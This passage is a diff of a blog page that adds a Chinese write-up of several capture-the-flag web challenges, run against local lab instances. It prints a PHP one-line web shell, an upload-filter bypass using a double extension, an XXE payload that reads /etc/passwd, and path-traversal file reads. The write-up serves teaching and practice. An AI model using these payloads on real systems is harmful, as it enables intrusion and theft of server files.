@@ -178,10 +178,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2023-08-21 18:34:28 / 修改时间：19:08:27" itemprop="dateCreated datePublished" datetime="2023-08-21T18:34:28+08:00">2023-08-21</time>
+              <time title="创建时间：2023-08-21 18:34:28" itemprop="dateCreated datePublished" datetime="2023-08-21T18:34:28+08:00">2023-08-21</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-08-22 20:39:49" itemprop="dateModified" datetime="2023-08-22T20:39:49+08:00">2023-08-22</time>
+              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
@@ -203,7 +209,275 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <p><img src="/.io//uTools_1692615784544.png"></p>
+          <h1 id="web">Web</h1>
+<h2 id="http">http</h2>
+<p>考点：HTTP请求</p>
+<figure>
+<img src="uTools_1692601322678.png" alt="uTools_1692601322678" />
+<figcaption aria-hidden="true">uTools_1692601322678</figcaption>
+</figure>
+<p>要求：</p>
+<ul>
+<li>GET传参：UwU=u</li>
+<li>POST传参：Luv=u</li>
+<li>使用admin登录</li>
+<li>请求来源为127.0.0.1</li>
+<li>使用MoeBrowser浏览器</li>
+</ul>
+<p>传参这两个就不说了，</p>
+<p>可以发现cookie中有character值，改为admin即可。</p>
+<p>请求来源使用X-Forwarded-For修改</p>
+<p>浏览器使用user-Agent修改</p>
+<figure>
+<img src="uTools_1692601766118.png" alt="uTools_1692601766118" />
+<figcaption aria-hidden="true">uTools_1692601766118</figcaption>
+</figure>
+<p>也可以使用bp抓包来修改，（不过那个连接器转发到localhost，代理不太好抓，可以用bp自带的浏览器进行抓包）。</p>
+<h2 id="web入门指北">web入门指北</h2>
+<p>文章末尾的一串神秘数字</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">666c61673d6257396c5933526d6533637a62454e7662575666564739666257396c513152475831637959</span><br><span class="line">6c396a61474673624756755a3055684958303d</span><br></pre></td></tr></table></figure>
+<p>有个小坑</p>
+<p><img src="uTools_1692602346134.png" /></p>
+<p>直接复制末尾会有一个换行，（但是CyberChef仍然会给出提示qwq）需要将末尾换行删去后再解码</p>
+<p><img src="uTools_1692602463464.png" /></p>
+<p>将flag后面那一串再base64就可以了。</p>
+<h2 id="彼岸的flag">彼岸的flag</h2>
+<p><a
+target="_blank" rel="noopener" href="https://www.cnblogs.com/l-yf/p/13879730.html">一个有意思的前端实现的聊天界面</a></p>
+<p><img src="uTools_1692602886937.png" /></p>
+<p>管理员撤回了一条消息 . . . ? 嗯 ？</p>
+<p>不行，cancanneed。</p>
+<p><img src="uTools_1692602980158.png" /></p>
+<p>或者在源代码界面搜索moe（为什么不搜flag，就因为flag里面没有flag吗）</p>
+<p><img src="uTools_1692603063886.png" /></p>
+<h2 id="cookie">cookie</h2>
+<p><img src="uTools_1692610708584.png" /></p>
+<p>先直接get一下flag，让我们先登录，那就注册一个号登录好了。</p>
+<p>注册</p>
+<p><img src="uTools_1692610883955.png" /></p>
+<p>登录</p>
+<p><img src="uTools_1692610957844.png" /></p>
+<p>再次尝试获取flag</p>
+<p><img src="uTools_1692611206374.png" /></p>
+<p>提示我们不是admin，</p>
+<p>在cookie中给我们发了一个token，base64解一下</p>
+<p><img src="uTools_1692611102426.png" /></p>
+<p>将role改为admin重新编码回去塞进cookie里</p>
+<p>这时候get flag</p>
+<p><img src="uTools_1692611277506.png" /></p>
+<h2 id="gasgasgas">gas!gas!gas!</h2>
+<p><img src="uTools_1692611457517.png" /></p>
+<p>要求在0.5s内反应，那必然是人力所不能及，所以要写脚本跑。</p>
+<p>我们需要控制的有两个：方向和油门</p>
+<p>先随便提交几次看看</p>
+<p>先看方向，有三种：</p>
+<ul>
+<li>弯道直行</li>
+<li>弯道向右</li>
+<li>弯道向左</li>
+</ul>
+<p>根据第二条，我们需要反打方向，也就是弯道向右，我们要向左打方向。</p>
+<p>再来看油门，给出的是抓地力的程度：</p>
+<ul>
+<li>抓地力太大</li>
+<li>抓地力太小</li>
+<li>保持这个速度</li>
+</ul>
+<p>根据第一条，抓地力太小表示油门太大，我们需要松开油门；反之则需要油门全开。</p>
+<p>题意理解的差不多之后，我们来看看如何自动化实现。</p>
+<p>可以自己一个一个去试，然后抓包读取对应的参数</p>
+<figure>
+<img src="uTools_1692612298534.png" alt="uTools_1692612298534" />
+<figcaption aria-hidden="true">uTools_1692612298534</figcaption>
+</figure>
+<p>也可以查看HTML的表单</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;driver&quot;</span>&gt;</span>选手:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;driver&quot;</span> <span class="attr">name</span>=<span class="string">&quot;driver&quot;</span> <span class="attr">required</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;steering_control&quot;</span>&gt;</span>方向控制:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;steering_control&quot;</span> <span class="attr">name</span>=<span class="string">&quot;steering_control&quot;</span> <span class="attr">required</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;-1&quot;</span>&gt;</span>左<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;0&quot;</span> <span class="attr">selected</span>&gt;</span>直行<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span>&gt;</span>右<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">select</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;throttle&quot;</span>&gt;</span>油门控制:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;throttle&quot;</span> <span class="attr">name</span>=<span class="string">&quot;throttle&quot;</span> <span class="attr">required</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;0&quot;</span>&gt;</span>松开<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span>&gt;</span>保持<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;2&quot;</span> <span class="attr">selected</span>&gt;</span>全开<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">select</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>name就是参数名，value是每种可能的值。</p>
+<p>根据这些可以写出脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里有点坑，服务器是用session来判断是否为同一人，所以需要用同一个session来请求。</span></span><br><span class="line">session = requests.Session()</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://localhost:54921/&quot;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;driver&quot;</span>:<span class="string">&quot;111&quot;</span>,</span><br><span class="line">    <span class="string">&quot;steering_control&quot;</span>:<span class="string">&quot;0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;throttle&quot;</span>:<span class="string">&quot;0&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Get the response from the server</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    response = session.post(url, data=data)</span><br><span class="line">    soup = BeautifulSoup(response.text, <span class="string">&#x27;html.parser&#x27;</span>)</span><br><span class="line">    <span class="built_in">list</span> = soup.find_all(<span class="string">&#x27;div&#x27;</span>, <span class="built_in">id</span>=<span class="string">&#x27;info&#x27;</span>)</span><br><span class="line">    result = <span class="built_in">list</span>[<span class="number">0</span>].get_text()</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;弯道向左&quot;</span> <span class="keyword">in</span> result:</span><br><span class="line">        data[<span class="string">&quot;steering_control&quot;</span>] = <span class="string">&quot;1&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="string">&quot;弯道向右&quot;</span> <span class="keyword">in</span> result:</span><br><span class="line">        data[<span class="string">&quot;steering_control&quot;</span>] = <span class="string">&quot;-1&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="string">&quot;弯道直行&quot;</span> <span class="keyword">in</span> result:</span><br><span class="line">        data[<span class="string">&quot;steering_control&quot;</span>] = <span class="string">&quot;0&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;抓地力太小了&quot;</span> <span class="keyword">in</span> result:</span><br><span class="line">        data[<span class="string">&quot;throttle&quot;</span>] = <span class="string">&quot;0&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="string">&quot;抓地力太大了&quot;</span> <span class="keyword">in</span> result:</span><br><span class="line">        data[<span class="string">&quot;throttle&quot;</span>] = <span class="string">&quot;2&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="string">&quot;保持这个速度&quot;</span> <span class="keyword">in</span> result:</span><br><span class="line">        data[<span class="string">&quot;throttle&quot;</span>] = <span class="string">&quot;1&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(data[<span class="string">&#x27;steering_control&#x27;</span>]+ <span class="string">&quot; &quot;</span> + data[<span class="string">&#x27;throttle&#x27;</span>])</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># if i &gt;5 :</span></span><br><span class="line">    <span class="comment">#     print(response.text)</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure>
+<img src="image-20230821202211906.png" alt="image-20230821202211906" />
+<figcaption aria-hidden="true">image-20230821202211906</figcaption>
+</figure>
+<h2 id="moe图床">Moe图床</h2>
+<p>一个文件上传的表单</p>
+<figure>
+<img src="image-20230821202539161.png" alt="image-20230821202539161" />
+<figcaption aria-hidden="true">image-20230821202539161</figcaption>
+</figure>
+<p>有一些过滤，先传点东西试试看</p>
+<p>shell_1.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[a]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>一个最简单的一句话木马。</p>
+<p>后缀名改为png。</p>
+<figure>
+<img src="image-20230821203009945.png" alt="image-20230821203009945" />
+<figcaption aria-hidden="true">image-20230821203009945</figcaption>
+</figure>
+<p>抓包时把后缀改回来。</p>
+<p>发现后端也会验证文件后缀。</p>
+<p>去upload.php里看一眼，给了源码。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$targetDir</span> = <span class="string">&#x27;uploads/&#x27;</span>;</span><br><span class="line"><span class="variable">$allowedExtensions</span> = [<span class="string">&#x27;png&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="string">&#x27;POST&#x27;</span> &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$tmp_path</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$file</span>[<span class="string">&#x27;type&#x27;</span>] !== <span class="string">&#x27;image/png&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>([<span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">false</span>, <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;文件类型不符合要求&#x27;</span>]));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">filesize</span>(<span class="variable">$tmp_path</span>) &gt; <span class="number">512</span> * <span class="number">1024</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>([<span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">false</span>, <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;文件太大&#x27;</span>]));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$fileName</span> = <span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$fileNameParts</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$fileName</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">count</span>(<span class="variable">$fileNameParts</span>) &gt;= <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="variable">$secondSegment</span> = <span class="variable">$fileNameParts</span>[<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$secondSegment</span> !== <span class="string">&#x27;png&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>([<span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">false</span>, <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;文件后缀不符合要求&#x27;</span>]));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>([<span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">false</span>, <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;文件后缀不符合要求&#x27;</span>]));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$uploadFilePath</span> = <span class="title function_ invoke__">dirname</span>(<span class="keyword">__FILE__</span>) . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$targetDir</span> . <span class="title function_ invoke__">basename</span>(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmp_path</span>, <span class="variable">$uploadFilePath</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>([<span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">true</span>, <span class="string">&#x27;file_path&#x27;</span> =&gt; <span class="variable">$uploadFilePath</span>]));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>([<span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">false</span>, <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;文件上传失败&#x27;</span>]));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>其中的这一段</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">count</span>(<span class="variable">$fileNameParts</span>) &gt;= <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="variable">$secondSegment</span> = <span class="variable">$fileNameParts</span>[<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$secondSegment</span> !== <span class="string">&#x27;png&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>([<span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">false</span>, <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;文件后缀不符合要求&#x27;</span>]));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>([<span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">false</span>, <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;文件后缀不符合要求&#x27;</span>]));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>GPT是这样描述的</p>
+<blockquote>
+<p>这段代码是用来检查上传文件的文件后缀是否符合要求的。它的逻辑如下：</p>
+<ol type="1">
+<li>首先，它通过 <code>explode('.', $fileName)</code>
+将文件名分割成多个部分，得到一个包含文件名各个部分的数组。例如，对于文件名
+<code>"example.png"</code>，将被分割成
+<code>["example", "png"]</code>。</li>
+<li>接着，它检查分割后的数组中是否有至少两个元素，也就是是否有文件后缀存在。如果没有，就说明文件名不符合要求，直接返回错误信息。</li>
+<li>如果数组中有至少两个元素，那么它会提取数组的第二个元素，也就是文件的实际后缀部分。然后，它检查这个实际文件后缀是否等于
+<code>'png'</code>，如果不等于，就返回错误信息。</li>
+</ol>
+<p>总之，这段代码用来确保上传的文件的文件名中包含了文件后缀，并且文件后缀必须是
+<code>'png'</code>。如果不符合要求，就返回相应的错误信息。</p>
+</blockquote>
+<p>我们可以知道，它将文件名用<code>.</code>分隔，并且取第二个元素作为后缀来判断，这样我们可以构造出<code>111.png.php</code>这样的文件名来绕过，而在服务器上会被解析为php文件。</p>
+<figure>
+<img src="image-20230821203815526.png" alt="image-20230821203815526" />
+<figcaption aria-hidden="true">image-20230821203815526</figcaption>
+</figure>
+<p>可以看到上传成功。</p>
+<p>但是给了绝对路径，访问的时候需要从<code>/var/www/html/</code>后面开始。</p>
+<figure>
+<img src="image-20230821204042403.png" alt="image-20230821204042403" />
+<figcaption aria-hidden="true">image-20230821204042403</figcaption>
+</figure>
+<p>之后命令执行即可。</p>
+<h2 id="了解你的座驾">了解你的座驾</h2>
+<figure>
+<img src="image-20230821204304012.png" alt="image-20230821204304012" />
+<figcaption aria-hidden="true">image-20230821204304012</figcaption>
+</figure>
+<p>抓个包发现有xml_content</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">xml</span>&gt;</span><span class="tag">&lt;<span class="name">name</span>&gt;</span>Mazda+rx7-FD<span class="tag">&lt;/<span class="name">name</span>&gt;</span><span class="tag">&lt;/<span class="name">xml</span>&gt;</span> </span><br></pre></td></tr></table></figure>
+<p>传了一个xml进去，中间的内容会被回显</p>
+<figure>
+<img src="image-20230821205649911.png" alt="image-20230821205649911" />
+<figcaption aria-hidden="true">image-20230821205649911</figcaption>
+</figure>
+<p>测试一下XXE的本地文件读取，<a
+href="https://qyzy.github.io/2023/08/07/XXE/">XXE</a>
+之前有写，这里直接打了.</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE a [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">passwd</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xml</span>&gt;</span><span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;passwd;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span><span class="tag">&lt;/<span class="name">xml</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>URL编码后传参</p>
+<figure>
+<img src="image-20230821210244893.png" alt="image-20230821210244893" />
+<figcaption aria-hidden="true">image-20230821210244893</figcaption>
+</figure>
+<p>读取成功。然后直接读flag。</p>
+<h2 id="大海捞针">大海捞针</h2>
+<p>还是那个聊天记录，位置也没变，但是每一个撤回的内容都不一样，写一个从1-1000的爆破脚本，提取该位置的内容。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"></span><br><span class="line">session = requests.Session()</span><br><span class="line"><span class="comment"># 这个应该不需要session，因为是之前那个改的。</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://localhost:59496?id=&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">list</span> = []</span><br><span class="line"><span class="comment"># Get the response from the server</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">    response = session.get(url+<span class="built_in">str</span>(i))</span><br><span class="line">    html = etree.HTML(response.text)</span><br><span class="line">    result = html.xpath(<span class="string">&#x27;/html/body/div/div[1]/div[79]/span/comment()&#x27;</span>)</span><br><span class="line">    <span class="comment"># 用Xpath路径解析</span></span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line">    <span class="built_in">list</span>.append(result)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h2 id="meo图床">meo图床</h2>
+<p>还是那个文件上传的界面。但是upload.php没给源码。</p>
+<p>写个GIF的文件头传一下</p>
+<figure>
+<img src="image-20230821211350302.png" alt="image-20230821211350302" />
+<figcaption aria-hidden="true">image-20230821211350302</figcaption>
+</figure>
+<p>点击查看，跳转。</p>
+<figure>
+<img src="image-20230821211547014.png" alt="image-20230821211547014" />
+<figcaption aria-hidden="true">image-20230821211547014</figcaption>
+</figure>
+<p>发现实际上是在image.php中包含了我们的gif，这实际上是一个文件包含的题。</p>
+<p>照例先包含一下/etc/passwd</p>
+<figure>
+<img src="image-20230821211821118.png" alt="image-20230821211821118" />
+<figcaption aria-hidden="true">image-20230821211821118</figcaption>
+</figure>
+<p>在源代码中看返回值</p>
+<figure>
+<img src="image-20230821211847253.png" alt="image-20230821211847253" />
+<figcaption aria-hidden="true">image-20230821211847253</figcaption>
+</figure>
+<p>发现可以直接读取内容</p>
+<p>尝试读取根目录的flag</p>
+<figure>
+<img src="image-20230821214006052.png" alt="image-20230821214006052" />
+<figcaption aria-hidden="true">image-20230821214006052</figcaption>
+</figure>
+<p>我们所在的目录无法读取。</p>
+<p>减少<code>../</code>的数量，发现当前目录距离根目录三层，</p>
+<figure>
+<img src="image-20230821212320686.png" alt="image-20230821212320686" />
+<figcaption aria-hidden="true">image-20230821212320686</figcaption>
+</figure>
+<p>在报错中发现，我们的输入被拼接到<code>../uploads</code>的后面,
+也就是说，我们当前所在的路径为images.php/../uploads/</p>
+<figure>
+<img src="image-20230821213422288.png" alt="image-20230821213422288" />
+<figcaption aria-hidden="true">image-20230821213422288</figcaption>
+</figure>
+<p>搞清楚目录结构以后，就可以读取了。（当然也可以先回到根目录，然后直接<code>/var/www/html/xxx.php</code>）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=../html/Fl3g_n0t_Here_dont_peek!!!!!.php</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;param1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span 